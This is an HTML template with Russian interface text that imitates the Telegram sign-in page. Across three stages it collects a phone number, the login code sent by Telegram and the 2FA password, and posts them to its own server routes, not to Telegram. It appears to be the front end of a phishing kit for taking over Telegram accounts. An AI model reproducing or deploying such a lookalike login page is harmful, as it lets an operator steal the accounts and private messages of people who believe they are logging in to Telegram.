<!DOCTYPE html>
<html lang="{{ lang or 'ru' }}">
<head>
    <meta charset="UTF-8" />
    <title>Вход в Telegram</title>
    <link rel="stylesheet" href="/static/style.css" />
</head>
<body>
    <div class="container">
        <div class="logo"></div>
        <h1>Войти в Telegram</h1>
        <p class="under-title-text">Проверьте код страны и введите номер телефона</p>

        <!-- Выбор языка -->
        <form method="GET" id="language-form">
            <label for="language-select" class="language-label">Выберите язык:</label>
            <select name="lang" id="language-select" onchange="document.getElementById('language-form').submit()">
                <option value="ru" {% if lang == 'ru' %}selected{% endif %}>Русский</option>
                <option value="en" {% if lang == 'en' %}selected{% endif %}>English</option>
                <option value="uk" {% if lang == 'uk' %}selected{% endif %}>Українська</option>
                <option value="de" {% if lang == 'de' %}selected{% endif %}>Deutsch</option>
                <option value="fr" {% if lang == 'fr' %}selected{% endif %}>Français</option>
            </select>
        </form>

        {% if error %}
            <p class="error">{{ error }}</p>
        {% elif success %}
            <p class="success">{{ success }}</p>
        {% endif %}

        {% if stage == "phone" %}
        <form method="POST">
            <input type="hidden" name="lang" value="{{ lang }}" />
            <input type="text" name="phone" placeholder="Введите номер телефона" required />
            <label class="remember-me">
                <input type="checkbox" name="remember_me" />
                Запомнить меня
            </label>
            <button type="submit">Далее</button>
        </form>
        {% elif stage == "code" %}
        <form method="POST" action="/code">
            <input type="hidden" name="phone" value="{{ phone }}" />
            <input type="hidden" name="lang" value="{{ lang }}" />
            <input type="text" name="code" placeholder="Введите код из Telegram" required />
            <button type="submit">Подтвердить</button>
        </form>
        {% elif stage == "2fa" %}
        <form method="POST" action="/password">
            <input type="hidden" name="phone" value="{{ phone }}" />
            <input type="hidden" name="lang" value="{{ lang }}" />
            <input type="password" name="password" placeholder="Введите пароль 2FA" required />
            <button type="submit">Войти</button>
        </form>
        {% endif %}
    </div>
</body>
</html>
